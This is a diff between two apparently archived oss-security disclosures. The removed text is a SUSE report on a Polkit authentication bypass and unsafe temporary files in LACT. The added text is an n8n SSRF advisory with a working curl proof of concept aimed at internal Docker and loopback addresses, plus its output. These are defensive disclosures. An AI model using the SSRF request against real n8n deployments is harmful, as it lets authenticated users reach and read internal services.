@@ -1,192 +1,114 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/31/9
-Message-ID: <apWNdY7zoZySbWW9@kasco.suse.de>
-Date: Mon, 31 Aug 2026 16:19:33 +0200
-From: Matthias Gerstner <mgerstner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/06/27/7
+Message-ID: <CAJNb=ZpHznOizp=ffbk5TUKPj68hLuVAXJn+Jsf76=AkohjK2Q@mail.gmail.com>
+Date: Sat, 27 Jun 2026 01:02:31 -0700
+From: Akshat Sinha <akshat.snh@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: LACT: Polkit Authentication Bypass and Temporary File Handling Issues (CVE-2026-75037, CVE-2026-75038)
+Subject: n8n: SSRF remains exploitable in default configuration (incomplete fix, no CVE)
 Content-Type: text/plain; charset=utf-8
 
-Hello list,
+n8n: authenticated SSRF in GET /rest/workflows/from-url;
+affected: <=2.19.x unconditionally, and 2.20.0+
+when N8N_SSRF_PROTECTION_ENABLED is
+unset (default false); verified on 2.27.4 (stable, source review) and
+2.28.2 (pre-release, live test); CWE-918; CVE: none;
+fix was independent prior vendor work, not credited here.
 
-this is a report about security issues in the LACT GPU control
-utilities. We also offer a rendered version of this report on our blog
-[1].
+GET /rest/workflows/from-url accepts a user-controlled url parameter and
+makes a server-side HTTP request to it. Any authenticated user with
+project-scoped workflow:create permission can use this to reach
+loopback, link-local, and RFC1918 addresses. If the target returns JSON
+shaped like an n8n workflow ({"nodes":..., "connections":...}), the body
+is reflected to the caller.
 
-Summary: LACT is a daemon and graphical UI for controlling GPUs on
-Linux. A review of a UNIX domain socket API uncovered a Polkit
-authentication bypass resulting in a potential local root exploit, and
-issues in temporary file creation.
+The relevant code path is
+packages/cli/src/workflows/workflows.controller.ts, where
+fetchWorkflowFromUrl() now uses:
 
-1) Introduction
-===============
+    private async fetchWorkflowFromUrl(url: string) {
+      const client = this.outboundHttp.requests({
+        ssrf: this.ssrfConfig.enabled ? this.ssrfProtectionService
+                                      : 'disabled',
+      });
+      ...
+    }
 
-LACT [2] is a daemon and graphical user interface for controlling GPU
-devices on Linux. Beyond providing access to device information,
-features like GPU overclocking and cooler control are included. In a
-recent update of LACT a Polkit policy appeared, which triggered a review
-[3] for the corresponding package in openSUSE Tumbleweed.
+The gate is this.ssrfConfig.enabled. In
+packages/@.../config/src/configs/ssrf-protection.config.ts (verified on
+tag n8n@...8.2):
 
-During the review we identified a Polkit authentication bypass and a
-predictable temporary file name issue, resulting in potential local root
-exploits. The following sections describe the security issues in detail.
-This report is based on release v0.10.0 [4] of LACT.
+    @Env('N8N_SSRF_PROTECTION_ENABLED')
+    enabled: boolean = false;
 
-2) The LACT Daemon
-==================
+So 2.20.0 added SSRF protection for this path, but behind an opt-in flag
+that defaults to false. Default installs therefore remain exploitable.
+Current stable 2.27.4 is affected by source review. The current
+pre-release 2.28.2 is affected by live test. 2.28.2 is not a stable
+release.
 
-LACT contains a systemd service unit [5] which runs the `lact` program
-as a daemon with full root privileges. No systemd service hardening is
-in place. The daemon exposes a UNIX domain socket in `/run/lactd.sock`.
-Upstream intends this socket to be accessible by members of either the
-`wheel` or the `sudo` group. In openSUSE Tumbleweed a stricter opt-in
-model is used instead: only members of a dedicated `lact` group are
-allowed to access the socket.
+When N8N_SSRF_PROTECTION_ENABLED=true, the request is routed through
+SsrfProtectionService, which checks resolved IPs before the request, at
+connect time via custom lookup, and across redirects. With the flag
+unset, the request is made with ssrf: 'disabled'.
 
-The socket is used to exchange LACT-specific messages based on the Rust
-serde [6] serialization format. In version 0.10.0 of LACT, some of the
-message types supported by the daemon have been additionally protected
-by Polkit authentication checks.
+Minimal PoC (executed 2026-06-26 local time against n8nio/n8n:2.28.2;
+listener timestamps below are UTC):
 
-3) Security Issues
-==================
+    docker run -d -p 5678:5678 \
+      -e N8N_SECURE_COOKIE=false \
+      n8nio/n8n:2.28.2
 
-3.1) Polkit Authentication Bypass due to PID Race (CVE-2026-75037)
-==================================================================
+    curl -s -G -b cookies.txt \
+      'http://localhost:5678/rest/workflows/from-url' \
+      --data-urlencode "projectId=$PROJECT_ID" \
+      --data-urlencode 'url=http://172.17.0.1:8888/'
 
-The Polkit authentication in the LACT daemon relies on function
-`check_auth()` [7], which authenticates the client solely based on its
-PID, which is a known misuse in Polkit authentication. A malicious
-client can attempt to send out the request, then cycle PIDs in an
-attempt to replace its own PID by a privileged process to alter the
-outcome of the Polkit authentication check.
+Default install result:
 
-Polkit authentication in LACT is used to prevent unprivileged users from
-adding so-called profile hooks to the LACT configuration. These hooks
-are basically scripts that will be executed with full root privileges as
-soon as a LACT profile is (de)activated. As a result, a Polkit
-authentication bypass in this context allows to gain full root access.
-Due to the access restrictions to the LACT UNIX domain socket, the
-privilege escalation is only possible for users that already own a
-certain level of privilege (i.e. membership in the `wheel`, `sudo` or
-`lact` group).
+    {"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}
+    --> HTTP 200
 
-We assigned CVE-2026-75037 to track this issue. Upstream fixed this flaw
-in commit d0478fe4 [8] by additionally passing the caller's UID to the
-Polkit daemon, preventing race conditions from influencing the outcome
-of the authorization.
+Listener log on the internal host:
 
-Shortly before publication of this report the upstream author informed
-us about a more deeply rooted issue [9] in Rust crate `zbus_polkit`
-which affects various Rust applications that attempt to pass client UIDs
-to Polkit. Due to a D-Bus data type mismatch the UID seems to be
-silently dropped from the authentication data, resulting again in the
-same weakness. An update of the `zbus_polkit` crate, which is part of
-Rust vendor sources of various packages is thus strongly recommended to
-developers of affected applications and distributors. For LACT a bugfix
-commit [10] is already available.
+    2026-06-27T04:20:15Z VICTIM-HIT path=/ UA=n8n from=172.17.0.2
 
-3.2) Predictable Temporary File Creation in Snapshot API (CVE-2026-75038)
-=========================================================================
+A loopback target such as http://127.0.0.1:5678/rest/settings also
+causes the server-side request to be issued; the response is HTTP 400
+only because that body is not workflow-shaped.
 
-The `generate_snapshot()` [11] function is accessible without Polkit
-authentication. It creates a tarball in paths of the pattern
-`/tmp/LACT-v{DAEMON_VERSION}-snapshot-{datetime}.tar.gz`, which are
-predictable. The system calls used by the daemon to create these files
-are as follows (`strace` excerpt):
+With N8N_SSRF_PROTECTION_ENABLED=true, the same request returns:
 
-    openat(AT_FDCWD, "/tmp/LACT-v0.10.0-snapshot-20260819-101819.tar.gz" O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0666) = 17
-    [...]
-    fchmod(17, 0775) = 0
+    {"code":0,"message":"The request was blocked because it resolves
+    to a restricted IP address"}
+    --> HTTP 400
 
-As can be seen there is no `O_NOFOLLOW` and no `O_EXCL` flag passed
-here. On systems without the `protected_symlinks` and
-`protected_regular` sysctls enabled this allows various attack vectors:
+and no new listener hit is recorded.
 
-- local Denial-of-Service: by pointing symbolic links to vital system
-  files, the target files will be overwritten, breaking the system. The
-  content of the tarball is not attacker-controlled (or at best partly
-  and indirectly), therefore further privilege escalation should not be
-  possible this way.
-- Denial-of-Service against the LACT daemon: by placing a special file
-  like a FIFO named pipe in this location the daemon will block forever,
-  trying to write data to it.
-- local information leak: the tarball contains data about GPU devices
-  and LACT configuration; mostly information that is available to all
-  users in the system anyway. By placing a symlink to a private file,
-  however, the target file will end up with world-readable permissions,
-  due to the `fchmod()`. The content of the file will be lost due to the
-  `O_TRUNC` flag during `openat()`, but the file might be re-populated
-  with sensitive data by privileged processes at a later time, without
-  restoring the original safe file permissions.
+Vendor handling / timeline:
 
-With the kernel hardenings `protected_symlinks` and `protected_regular`
-enabled, which is the default on most systems, these issues are
-fortunately not exploitable.
+    2026-04-27  n8n opened PR #29178 under ticket CAT-2890
+    2026-04-29  I reported the same issue independently
+    2026-04-29  PR #29178 merged
+    2026-05-05  n8n 2.20.0 released with the protection gated by flag
+    2026-05-20  vendor declined the report
+    2026-06-26  live PoC re-run against 2.28.2 (local date)
 
-A side effect of how the tarball creation in LACT works at the moment is
-that the snapshot tarball cannot be deleted by the client that asked for
-it, since it is owned by `root`. As there is already a UNIX domain
-socket available, we suggested to upstream to use file descriptor
-passing instead: the client passes to the daemon an already open file
-where the tarball data will be written. This way neither `open()` nor
-`chmod()` calls will be necessary in the privileged daemon, resulting in
-a much cleaner design.
+PR #29178 predates my report. I do not claim credit for that fix. The
+point of this post is narrower: the shipped protection is off by
+default, so the default configuration remains exploitable on current
+releases. No CVE or GHSA has been issued.
 
-We assigned CVE-2026-75038 to track this issue. Upstream fixed this flaw
-in commit 2aae677d0 [12] by invoking `File::create_new()` instead of
-plain `File::create()`. This results in the `O_EXCL` flag to be passed
-to the `openat()` system call shown above, preventing both opening
-already existing files and following symbolic links.
+Mitigation:
 
-4) Coordinated Disclosure and Upstream Bugfix Release
-=====================================================
+    set N8N_SSRF_PROTECTION_ENABLED=true
 
-We offered coordinated disclosure to upstream, who declined and quickly
-pushed bugfixes to the LACT GitHub project instead. The bugfixes
-(including the `zbus_polkit` fix) are included in the recently published
-release v0.10.1 [13].
+This causes the import endpoint to use the SSRF checks. Network egress
+filtering is also advisable.
 
-5) Timeline
-============
+References:
+- PR #29178: https://github.com/n8n-io/n8n/pull/29178
+- Public write-up:
+https://github.com/akshatgit/public-disclosure/blob/main/advisories/2026-06-26-n8n-ssrf-workflows-from-url.md
 
-2026-08-19: We reached out privately to the owner of the LACT GitHub project, offering coordinated disclosure.
-2026-08-19: We received a reply in which upstream declined coordinated disclosure, pointing out two public bugfix commits instead.
-2026-08-24: Due to a lost email on our end we only noticed at this time that there was an upstream reply and started acting on it.
-2026-08-25: We assigned CVEs for the issues in this report and shared them with upstream.
-2026-08-25: Our LACT packager backported the upstream bugfixes allowing us to progress with the openSUSE Tumbleweed LACT update to version 0.10.0.
-2026-08-28: We received a follow-up email from upstream pointing out that an issue in Rust's `zbus_polkit` [9] causes the subject's UID information to be silently dropped from Polkit authentication calls.
-2026-08-28: Publication of this report.
+Reporter: Akshat Sinha
 
-6) References
-==============
-
-[1]: https://security.opensuse.org/2026/08/31/lact-gpu-control.html
-[2]: https://github.com/ilya-zlobintsev/LACT
-[3]: https://bugzilla.suse.com/show_bug.cgi?id=1274863
-[4]: https://github.com/ilya-zlobintsev/LACT/releases/tag/v0.10.0
-[5]: https://github.com/ilya-zlobintsev/LACT/blob/v0.10.0/res/lactd.service
-[6]: https://serde.rs/
-[7]: https://github.com/ilya-zlobintsev/LACT/blob/2aa6d0d770546fb36dd8714801c373060e4dd912/lact-daemon/src/server/handler.rs#L1273
-[8]: https://github.com/ilya-zlobintsev/LACT/commit/d0478fe42c2219454e272f96b1cbd29ab37ee566
-[9]: https://github.com/z-galaxy/zbus_polkit/pull/101
-[10]: https://github.com/ilya-zlobintsev/LACT/commit/40dcf29841e9da56b787b7af0e5ba27d9ce18e0c
-[11]: https://github.com/ilya-zlobintsev/LACT/blob/2aa6d0d770546fb36dd8714801c373060e4dd912/lact-daemon/src/server/handler.rs#L717
-[12]: https://github.com/ilya-zlobintsev/LACT/commit/2aae677d0e94bd2824cbe3dab6dc9ac795cae013
-[13]: https://github.com/ilya-zlobintsev/LACT/releases/tag/v0.10.1
-
-Best Regards
-
-Matthias
-
--- 
-Matthias Gerstner <matthias.gerstner@...e.de>
-Security Engineer
-https://www.suse.com/security
-GPG Key ID: 0x14C405C971923553
- 
-SUSE Software Solutions Germany GmbH
-HRB 36809, AG Nürnberg
-Geschäftsführer: Jochen Jaser, Andrew McDonald
-
-Download attachment "signature.asc" of type "application/pgp-signature" (871 bytes)
